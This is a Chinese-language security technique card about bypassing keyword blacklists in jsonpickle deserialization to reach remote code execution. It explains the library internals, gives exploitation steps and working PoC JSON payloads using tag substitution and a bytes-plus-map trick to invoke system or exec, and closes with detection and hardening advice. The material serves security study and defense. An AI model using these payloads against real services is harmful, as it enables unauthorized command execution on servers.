---
id: web-python-deserialization-jsonpickle-tag-swap-newargsex-map-bytes-rce
title: jsonpickle 标签层绕过：黑名单封禁 py/reduce、py/tuple、py/function 时改用 py/newargsex｜py/newargs｜py/initargs 传参、py/set 代 tuple、py/type 代 function，并用 builtins.bytes+map 在 cls.__new__ 处触发
type: scenario
domain: web
path: web/python/deserialization
technique: jsonpickle-tag-substitution-newargsex-set-type-bytes-map
aliases:
- jsonpickle py/newargsex
- jsonpickle py/initargs
- jsonpickle py/type 绕过 py/function
- jsonpickle py/set 代替 py/tuple
- builtins.bytes map 触发 RCE
- jsonpickle 标签替换
- safe=True jsonpickle RCE
tags:
- web
- python
- jsonpickle
- deserialization
- waf-bypass
- tag-abuse
- rce
- token
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:36:24+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；restore/_restore_tags/_restore_object_instance/getargs 语义、py/newargsex|newargs|initargs、py/set 代 tuple、py/type 代 function、builtins.bytes+map 与 py/b64 返回 bytes 导致 TypeError 均与正文代码块一致；原文 WAF 的 return True 写在 for 循环体内（只检查 repr 一个词）已核对；PoC 为正文非法 JSON 字面量改写为合法 JSON，未在本机 jsonpickle 复跑
---

## 一句话结论

`jsonpickle.decode()` 的恢复过程是「按 JSON 里的键名反射」而不是「按声明类型还原」：一旦 WAF 只把 `py/reduce`、`py/tuple`、`py/function` 这类**键名**列入黑名单，攻击者仍能把同一条 `__reduce__` 链改写成 `py/object` + `py/newargsex`（或 `py/newargs`／`py/initargs`）传参，用 `py/set` 顶替 `py/tuple`、用 `py/type` 顶替 `py/function`；更隐蔽的一条是把 `builtins.map` 当成参数塞给 `builtins.bytes`，让 `bytes.__new__` 在消费可迭代对象时执行 `map` 里的函数，从而在第一处 RCE 点（`cls.__new__`）就完成命令执行。

## 原理

- **恢复入口按类型分流**：`jsonpickle.unpickler.Unpickler.restore()` 先判断 `obj` 是否为 `str/list/dict/set/tuple`，是则走 `_restore_tags()`，否则 `_passthrough`；`_restore_tags()` 再按 dict 里的键（`py/object`、`py/type`、`py/function`、`py/reduce`、`py/tuple`、`py/set`、`py/newargs`…）分派到对应 `_restore_xxx`。因此「标签是否被 WAF 关键词命中」与「能否还原成可调用对象」是两件事，键名可以换，语义不会变。
- **`py/object` 自带两条 RCE 路**：`_restore_object` → `_restore_object_instance(obj, cls, ...)` 里先用 `cls` 通过 `loadclass()`（`__import__` + 逐段 `getattr`）解析成真正的类/函数，然后：
  - 若 `is_oldstyle = not (isinstance(cls, type) or getattr(cls, '__meta__', None))` 为假且 `hasattr(cls, '__new__')`，走 `instance = cls.__new__(cls, *args, **kwargs)`——**第一处 RCE 点**，`args` 是攻击者完全可控的对象；
  - 否则走 `instance = cls(*args)`——**第二处 RCE 点**，等于直接调用该 callable。
  于是「把 `os.system` 之类的 callable 当成 `py/object` 的类名」本身就是一条命令执行通道，不必依赖 `py/reduce`。
- **参数标签有三个入口**：`if has_tag(obj, tags.NEWARGSEX): args, kwargs = obj[tags.NEWARGSEX]`，否则 `args = getargs(obj, classes=...)`；`getargs()` 认的键是 `py/newargs`（位置参数）与 `py/initargs`。所以封掉 `py/newargsex` 还有两个同效键名可用，反之亦然。
- **`py/set` 与 `py/tuple` 等价于序列容器**：`_restore_tuple` 是 `tuple([self._restore(v) for v in obj[tags.TUPLE]])`，`_restore_set` 是 `{self._restore(v) for v in obj[tags.SET]}`。两者都把子元素逐个 restore 后当可迭代对象交给上层，因此在「只需要一串位置参数」的场景里 `py/set` 可以完全替代 `py/tuple`；区别只是集合会去重、无序，参数只有一个时无影响。
- **`py/type` 等价于 `py/function` 的加载能力**：`_restore_type` 直接 `loadclass(obj[tags.TYPE], classes=...)` 并原样返回该类对象，`_restore_function` 也一样走 `loadclass`。所以 `{"py/reduce": [{"py/type": "nt.system"}, {"py/tuple": ["whoami"]}]}` 与用 `py/function` 写 `builtins.eval` 的效果一致——只要 `py/reduce` 本身没被拦。
- **`builtins.bytes` + `builtins.map` 为什么能执行**：`map(function, iterable)` 是惰性对象，只有被消费时才调用 `function`；`bytes.__new__(bytes, <iterable>)` 在构造时会把可迭代对象整体消费掉，于是 `map` 里的函数对每个元素执行一次。`_restore_object` 恰好先做 `cls.__new__(cls, *args)`，把 `map` 对象作为 `args` 交进去，`bytes.__new__` 一消费就触发了 `map` 的函数——这就是「不管走到哪一处 RCE 点，只要 bytes 初始化就会触发」的原因。
- **`py/b64`／`py/b85` 为什么在这条路上不可用**：`_restore_base64`／`_restore_base85` 返回的是 `bytes`，而目标 callable（如 `os.system`）在 `cls(*args)` 时要求 `str`，会在初始化处抛 `TypeError` 被 `except TypeError` 吞掉；所以编码类标签只能用于「本来就接收 bytes 的 sink」，不能用来藏 `os.system` 的参数。

## 触发条件

- 应用把用户可控数据（Cookie／token／表单字段）直接交给 `jsonpickle.decode()`，即使加了 `safe=True`（`safe` 只影响 `py/repr`，不影响 `py/object`／`py/reduce`／`py/type`）；
- WAF／黑名单实现是「对 `json.loads` 后再 `json.dumps` 的字符串做关键词匹配」，且关键词表针对的是标签名或模块名（`py/reduce`、`py/tuple`、`py/function`、`builtins`、`os`、`eval`、`exec`…）；
- 黑名单没有被正确执行（本例源码 `for keyword in BLACKLIST:` 里把 `return True` 写进了循环体，实际只检查了第一个词 `repr`）——这一点决定了「模块名带 os/builtins 的 payload 能不能发出去」；若黑名单真的生效，则必须配合模块名的等价替换（`nt.system`、`posix.system`、从已有模块属性取）才能过；
- 目标进程能 `__import__` 到被点名的模块（标准库即满足）。

## 利用步骤

1. 先确认入口形态：把 Cookie／token 做一次 base64 解码，若是 `{"py/object": "...Token", ...}` 说明后端就是 `jsonpickle.decode`，`py/object` 可用。
2. 试探黑名单粒度：分别发送 `{"py/reduce": ...}`、`{"py/tuple": ...}`、`{"py/function": ...}`，看哪一个被拦；被拦的键名换成同义标签（`py/reduce`→`py/object`；`py/tuple`→`py/set`；`py/function`→`py/type`）。
3. 传参标签三选一：`py/newargsex`（`[args, kwargs]` 两元组）、`py/newargs`（位置参数列表）、`py/initargs`（位置参数列表）。`py/newargsex` 的第二个元素必须存在且为空（`""`／`{}`／`null`），否则 `args, kwargs = obj[...]` 解包失败。
4. 挑一个不被拦的 callable：`nt.system`／`posix.system`／`os.system`／`subprocess.run`／`builtins.exec`；把命令放进被 restore 成序列的参数里。
5. 若 `py/reduce` 可用，用 `py/type` 装 callable、`py/tuple` 或 `py/set` 装参数，组成等价 `__reduce__`。
6. 想在 `cls.__new__` 处触发而非 `cls(*args)` 处触发时，把 `builtins.map(<func>, [<arg>])` 作为 `builtins.bytes` 的参数，靠 `bytes` 消费迭代器执行函数；这条不依赖 `os.system` 的 `__init__`，即使 `cls(*args)` 被 `except TypeError` 兜住也能打成。

## PoC

标签替换矩阵（同一语义的四种写法，按被拦的键名挑一个）：

```json
{"py/object": "nt.system", "py/newargsex": [{"py/set": ["whoami"]}, ""]}
```

```json
{"py/object": "os.system", "py/newargs": ["whoami"]}
```

```json
{"py/object": "os.system", "py/initargs": ["whoami"]}
```

```json
{"py/reduce": [{"py/type": "nt.system"}, {"py/set": ["whoami"]}]}
```

原文把 `py/set` 写成 Python 集合字面量 `["py/set":["whoami"]]`，实际发包必须是合法 JSON，故此处落成 `{"py/set": ["whoami"]}`；多点参数同理：

```json
{"py/object": "nt.system", "py/newargsex": [{"py/set": ["type", "2.py"]}, ""]}
```

`builtins.bytes` + `builtins.map` 走第一处 RCE 点（`cls.__new__`）：

```json
{"py/object": "builtins.bytes",
 "py/newargs": {"py/object": "builtins.map",
                "py/newargs": [{"py/function": "builtins.exec"}, ["print(123)"]]}}
```

等价于在宿主进程里执行：

```python
bytes.__new__(bytes, map(exec, ['print(123)']))
bytes(map.__new__(map, exec, ['print(1111)']))
```

## 变体与关联

- **变体（模块名拆解）**：黑名单真的生效时，`os`／`builtins` 这类词也会被拦，此时改用 `nt.system`（Windows）、`posix.system`（Linux 上 `posix` 是 `os` 的实现模块名之一）、或从 `__main__` 已有的 import 里取同名对象，避免出现被拦字面量。
- **变体（参数容器）**：`py/set` 去重会改变参数个数，需要重复参数时改用 `py/tuple` 或 `py/list`；只有一个参数时三者等价。
- **变体（`py/newargsex` 的第二元素）**：`py/newargsex` 解包成 `(args, kwargs)`，第二元素放 `{}` 即可传关键字参数，例如给 `subprocess.run` 传 `shell=True`。
- **边界**：`py/b64`／`py/b85` 返回 bytes，无法直接喂给要求 str 的 `os.system`，只能给本来就吃 bytes 的 sink；`safe=True` 也不拦 `py/object`／`py/reduce`／`py/type`，不要把它当安全边界。
- **关联**：[[web-python-deserialization-jsonpickle-tag-surface-info-leak-rce]]（同一库的标签面信息泄露与「挑可调用对象」路线；本卡讲的是「键名被黑名单封禁时的等价标签替换矩阵」与 `bytes+map` 的第一处 RCE 点）、[[web-python-deserialization-jsonpickle-forbidden-list-clear-bypass]]（另一条有状态绕过：先把全局黑名单清空）、[[web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass]]（同为「黑名单 vs 解析层语义」不一致）。

## 检测与防御

- **入口**：不要用 `jsonpickle` 解析不可信数据；会话／令牌改用 `itsdangerous` 签名或 JWT，服务端保存状态；必须用时显式传 `classes=` 白名单，并在 decode 前递归拒绝任何含 `py/` 前缀键的输入（`py/object`、`py/reduce`、`py/type`、`py/function`、`py/newargsex`、`py/newargs`、`py/initargs`、`py/set`、`py/tuple`、`py/b64`）。
- **不要只做键名黑名单**：本卡的四组替换说明「按键名匹配」可被同义标签绕过；正确做法是结构白名单（只允许业务需要的字段名与标量值）。
- **检测点**：请求体／解码后字符串出现 `py/newargsex`、`py/newargs`、`py/initargs`、`py/set`、`py/type`、`builtins.map`、`builtins.bytes`、`map(` 与 `exec` 组合；同一来源短时间内连续试探多个 `py/*` 键名（黑名单探测行为）；Web 进程派生执行 `exec`／`system` 或出现异常的子进程。
- **加固**：Web 进程最小权限；`builtins.bytes`／`map`／`exec` 一类对象在解析路径上不可达（用 `classes=` 限定只能是业务数据类）；WAF 规则表本身不可被请求修改。
